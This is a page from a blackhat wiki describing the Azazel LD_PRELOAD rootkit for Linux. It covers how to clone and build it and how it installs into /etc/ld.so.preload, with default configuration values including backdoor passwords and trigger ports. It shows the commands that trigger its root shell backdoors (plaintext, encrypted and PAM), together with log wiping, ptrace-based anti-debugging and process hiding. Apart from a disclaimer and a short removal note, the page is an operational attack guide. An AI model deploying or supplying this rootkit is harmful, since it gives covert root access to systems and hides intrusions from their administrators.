*Questions about this topic? [Sign
up](/Special:UserLogin "Special:UserLogin") to ask in the talk tab*.

\

Azazel {#firstHeading .firstHeading}
======

From Security101 - Blackhat Techniques - Hacking Tutorials -
Vulnerability Research - Security Tools

Jump to: [navigation](#column-one), [search](#searchInput)

**Azazel** is a userland rootkit written in [C](/C "C") based off of the
original [LD\_PRELOAD](/LD_PRELOAD "LD PRELOAD") technique from
[Jynx](/Jynx "Jynx") rootkit. It is more robust and has additional
features, and focuses heavily around *anti-debugging* and
*anti-detection*. Features include log cleaning, pcap subversion, [and
more](#Features).

[Tweet](https://twitter.com/share)

\

+--------------------------------------------------------------------------+
| Contents                                                                 |
| --------                                                                 |
|                                                                          |
| -   [1 Disclaimer](#Disclaimer)                                          |
| -   [2 Features](#Features)                                              |
| -   [3 Latest Source](#Latest_Source)                                    |
| -   [4 Hooking Methods](#Hooking_Methods)                                |
| -   [5 Configuration](#Configuration)                                    |
| -   [6 Backdoor Examples](#Backdoor_Examples)                            |
|     -   [6.1 Plaintext backdoor](#Plaintext_backdoor)                    |
|     -   [6.2 Crypthook backdoor](#Crypthook_backdoor)                    |
|     -   [6.3 PAM backdoor](#PAM_backdoor)                                |
| -   [7 Log Clearing](#Log_Clearing)                                      |
| -   [8 Anti-Debugging](#Anti-Debugging)                                  |
| -   [9 Process Hiding](#Process_Hiding)                                  |
| -   [10 Preliminary ldd/unhide                                           |
|     obfuscation](#Preliminary_ldd.2Funhide_obfuscation)                  |
| -   [11 Removal](#Removal)                                               |
| -   [12 Related](#Related)                                               |
+--------------------------------------------------------------------------+

Disclaimer
----------

  -------------------------------------------- -----------------------------------------------------------------------------------------------------------------------------------------------------
  ![RPU0j.png](http://i.imgur.com/RPU0j.png)   It is a crime to use techniques or tools on this page against any system without written authorization unless the system in question belongs to you
  -------------------------------------------- -----------------------------------------------------------------------------------------------------------------------------------------------------

Features
--------

-   Anti-debugging
-   Avoids unhide, lsof, ps, ldd detection
-   Hides files and directories
-   Hides remote connections
-   Hides processes
-   Hides logins
-   PCAP hooks avoid local sniffing
-   Two accept backdoors with full PTY shells.

-   Crypthook encrypted accept() backdoor
-   Plaintext accept() backdoor

-   PAM backdoor for local privesc and remote entry
-   Log cleanup for utmp/wtmp entries based on pty
-   Uses [xor](/Xor "Xor") to obfuscate static strings

Latest Source
-------------

-   Clone the sources

  --------------------------------------------------------------------------------------------------------------------
  **Terminal**
  \
  localhost:\~ \$ **git clone [https://github.com/chokepoint/azazel.git](https://github.com/chokepoint/azazel.git)**
  \
  --------------------------------------------------------------------------------------------------------------------

-   Build the rootkit

  --------------------------
  **Terminal**
  \
  localhost:\~ \$ **make**
  \
  --------------------------

  -------------------------------------------- -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
  ![RPU0j.png](http://i.imgur.com/RPU0j.png)   Running "make install" will inject the live kit into your system. While removal is not impossible, it's an unnecessary and painful procedure, not to mention you may forget to remove it.
  -------------------------------------------- -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Hooking Methods
---------------

Azazel utilizes the same hooking methods as [Jynx/Jynx2](/Jynx "Jynx").
You can hook individual programs at the time of execution by taking
advantage of the [LD\_PRELOAD](/LD_PRELOAD "LD PRELOAD") variable. By
default, Azazel installs itself as **libselinux.so** into */lib*. An
entry is then added to */etc/ld.so.preload* in order to hook system wide
dynamically compiled programs.

-   Example runtime hooking of bash.

  ------------------------------------------------------------
  **Terminal**
  \
  localhost:\~ \$ **LD\_PRELOAD=/lib/libselinux.so bash -l**
  \
  ------------------------------------------------------------

Instead of dlsym'ing direct libc functions by globally declaring
old\_syscall, Azazel has a new structure in azazel.h named
syscall\_list. This allows all of the required functions to be linked
upon initiation of the library. Syscall function names are XORed by
config.py and written to const.h. Original libc functions can be
accessed by using the preprocessor definitions also in const.h. Each
definition has a prefix of SYS\_name\_of\_function\_in\_caps. For
example to call libc's version of fopen, you would use
**syscalls[SYS\_FOPEN].syscall\_func();**

+--------------------------------------------------------------------------+
| ~~~~ {.de1}                                                              |
| typedef struct struct_syscalls {                                         |
|         char syscall_name[51];                                           |
|         void *(*syscall_func)();                                         |
| } s_syscalls;                                                            |
| ~~~~                                                                     |
+--------------------------------------------------------------------------+

Configuration
-------------

All [variables](/Variable "Variable") that require changing prior to
deployment are located near the top of config.py. Variable data is
[ciphered](/Cryptography "Cryptography") using an [XOR](/XOR "XOR") key
in order to not expose them to dumping programs like "strings." See
below for a list of variables and their associated purpose.

  -------------------------------------------- ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
  ![c3el4.png](http://i.imgur.com/c3el4.png)   The rootkit will hide all TCP/IP connections within these HIGH and LOW port ranges. These ranges are used to not only hide from netstat/lsof, but also to hide from sniffing using libpcap.
  -------------------------------------------- ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Numeric

Variable(s)

Description

Default

LOW\_PORT / HIGH\_PORT

Ports used to trigger full PTY plaintext backdoor.

61040 - 61050

CRYPT\_LOW / CRYPT\_HIGH

Ports used to trigger full PTY crypthook backdoor.

61051 - 61060

PAM\_PORT

Also hides this port but doesn't trigger accept backdoor.

61061

SHELL\_MSG

Display this string to users once they get a shell

Welcome

SHELL\_PASSWD

Shell password for both plaintext and crypthook backdoors

changeme

SHELL\_TYPE

Use this shell for accept() backdoors.

/bin/bash

MAGIC\_STRING

Hide any files with this string in the file name.

\_\_

BLIND\_LOGIN

Fake user account used to activate the PAM backdoor.

rootme

ANTI\_DEBUG\_MSG

Display this message to the sys admin if they try to ptrace

Don't scratch the walls.

CLEANUP\_LOGS

If this environment var is set to a valid pts, then cleanup utmp/wtmp
logs for that pts.

CLEANUP\_LOGS

\

-   The following variables are specifically included for the crypthook
    backdoor.

\

Numeric

Variable(s)

Description

Default

PASSPHRASE

This key is used for encryption / decryption of sessions

Hello NSA

KEY\_SALT

Key salt used for key derivation.

changeme

Backdoor Examples
-----------------

For each of these examples we are assuming that sshd is hooked with
azazel and able to trigger any of the three operational backdoors.

### Plaintext backdoor

We need to set the local port to something within the ranges of
**LOW\_PORT** and **HIGH\_PORT** as configured above. This not only
ensures that the connection will be hidden from local sniffing and
detection, but it also triggers a full PTY interactive shell upon
entering the correct password. The local port can be set using ncat's -p
option. Upon successfuly connecting to the remote daemon, the first line
you enter should be the **SHELL\_PASSWD** that you created.

       $ ncat target 22 -p 61040 
       changeme
       Welcome!
       Here's a shell.
       root@host:/root #

### Crypthook backdoor

Triggering the Crypthook backdoor is similar to the plain text backdoor,
but we need to speak the same protocol. Crypthook is an AES encryption
wrapper for TCP/UDP connections and can be downloaded from here. The
Crypthook relies on preload hooking as well, and can be used with netcat
by utilizing **LD\_PRELOAD** environment variable.

       $ LD_PRELOAD=./crypthook.so ncat localhost 22 -p 61051
       changeme
       Welcome!
       Here's a shell.
       root@host:/root/ #

### PAM backdoor

The PAM hooks work by waiting for the specified fake user to attempt a
connection. The hooks return the pw entry for root and accept any
password to establish a successful login. Since this method would
generally be used with sshd, the connection will not be hidden unless
you can force ssh client to bind to a local port within one of the port
ranges. Another client shared library has been included to force a
program to bind to a port that we'd like to hide.

       $ make client
       $ LD_PRELOAD=./client.so ssh rootme@localhost
       root@host:/ #

-   The PAM hooks can also be used for local privesc.

<!-- -->

       $ su - rootme
       #

Log Clearing
------------

Log clearing can be accomplished by setting the environment variable to
the tty/pts device that you want to remove from the records and then
executing a command. When accessing the target system using either of
the accept backdoors, the given pseudoterminal is automatically removed
from both utmp and wtmp log files. However, if you need to use the PAM
backdoor through SSH, you will need to manually remove your pts from the
logs as demonstrated below.

       $ w | grep pts/16
       root   pts/16   :0.0             Wed16    2:33m  0.16s  0.16s bash

       $ CLEANUP_LOGS="pts/16" ls
       utmp logs cleaned up.
       wtmp logs cleaned up.

       $ w | grep pts/16
       $

Anti-Debugging
--------------

Azazel hooks **ptrace()** and returns -1, hence denying any debugging
from occuring. The message displayed to the sysadmin is really more of a
joke than anything and will definitely set off alarms that something is
wrong.

       $ strace -p $PPID
       Don't scratch the walls

This works on any userland debugger (ltrace, strace, gdb, ftrace). This
hook could be easily extended to hide specific information should you
desire to do so.

Process Hiding
--------------

Jynx/Jynx2 relied on a specified GID in order to hide processes and
files. There are some obvious problems with using this method, so Azazel
addresses this by again using environment variables to mask any
processes that may give away our presence. The variable can also be
configured inside of **config.py**, but defaults to
**HIDE\_THIS\_SHELL**.

       $ env HIDE_THIS_SHELL=plz ncat -l -p 61061

When this environment variable is set, the process is able to see files
and processes hidden by the rootkit. This is important for the PAM hook.
Because PAM invokes [bash](/Bash "Bash") on its own, you have to use
this environment variable to access hidden files.

Preliminary ldd/unhide obfuscation
----------------------------------

Azazel avoids detection from ldd and unhide by selectively NOT hooking
those two programs. Once the programs are done, azazel continues hooking
programs as normal. This opens up a window for removing the offending
library, but at this point it is better than completely revealing the
kit. The next release will include a more advanced anti-debug /
ldd/unhide obfuscation.

Removal
-------

To remove Azazel, the best course of action is to boot into a livecd,
mount your bootable hard drive, and delete the /etc/ld\_preload.so file
from the partition.

Related
-------

-   [Linux](/Linux "Linux")
-   [LD\_PRELOAD](/LD_PRELOAD "LD PRELOAD")
-   [C](/C "C")
-   [CryptHook](http://www.chokepoint.net/2013/09/crypthook-secure-tcpudp-connection.html)
-   [Jynx](/Jynx "Jynx")
-   [Hooking PAM](/Hooking_PAM "Hooking PAM")

\

[Tweet](https://twitter.com/share)

Retrieved from
"[http://www.blackhatlibrary.net/Azazel](http://www.blackhatlibrary.net/Azazel)"

##### Views

-   [Page](/Azazel "View the content page [c]")
-   [Discussion](/index.php?title=Talk:Azazel&action=edit&redlink=1 "Discussion about the content page [t]")
-   [View
    source](/index.php?title=Azazel&action=edit "This page is protected.
    You can view its source [e]")
-   [History](/index.php?title=Azazel&action=history "Past revisions of this page [h]")

##### Personal tools

-   [Log
    in](/index.php?title=Special:UserLogin&returnto=Azazel "You are encouraged to log in; however, it is not mandatory [o]")

[](/Main_Page "Visit the main page")

##### Wiki

-   [Main page](/Main_Page "Visit the main page [z]")
-   [The index](/Category:Indexing)
-   [Donate](/Donations)
-   [Contribute](/Category:Requested_maintenance)
-   [Recent
    changes](/Special:RecentChanges "The list of recent changes in the wiki [r]")
-   [Random page](/Special:Random "Load a random page [x]")

##### Community

-   [Chokepoint](http://www.chokepoint.net)
-   [/r/blackhat](http://reddit.com/r/blackhat)
-   [@BlackhatStaff](http://twitter.com/BlackhatStaff)

##### Search

 

##### Toolbox

-   [What links
    here](/Special:WhatLinksHere/Azazel "List of all wiki pages that link here [j]")
-   [Related
    changes](/Special:RecentChangesLinked/Azazel "Recent changes in pages linked from this page [k]")
-   [Special
    pages](/Special:SpecialPages "List of all special pages [q]")
-   [Printable
    version](/index.php?title=Azazel&printable=yes "Printable version of this page [p]")
-   [Permanent
    link](/index.php?title=Azazel&oldid=46590 "Permanent link to this revision of the page")

 

[](http://www.srsvps.com/)

![](http://blackhatlibrary.net/images/srsvps-button-tux.png)

\
 [](http://vps-heaven.com/)

![](http://blackhatlibrary.net/images/vps-heaven.png)

\

VPS-Heaven now accepting BitCoin!

\

[](http://www.soldierx.com/)

![](http://www.soldierx.com/system/files/images/sx-mini-1.jpg)

\
\

Our research is made possible by your support.

\

![](https://www.paypalobjects.com/en_US/i/scr/pixel.gif)

[![Powered by
MediaWiki](/skins/common/images/poweredby_mediawiki_88x31.png)](http://www.mediawiki.org/)

-   This page was last modified on 14 February 2014, at 02:34.
-   This page has been accessed 33,310 times.
-   [Privacy
    policy](/Security101_-_Blackhat_Techniques_-_Hacking_Tutorials_-_Vulnerability_Research_-_Security_Tools:Privacy_policy "Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools:Privacy policy")
-   [About Security101 - Blackhat Techniques - Hacking Tutorials -
    Vulnerability Research - Security
    Tools](/Security101_-_Blackhat_Techniques_-_Hacking_Tutorials_-_Vulnerability_Research_-_Security_Tools:About "Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools:About")
-   [Disclaimers](/Security101_-_Blackhat_Techniques_-_Hacking_Tutorials_-_Vulnerability_Research_-_Security_Tools:General_disclaimer "Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools:General disclaimer")

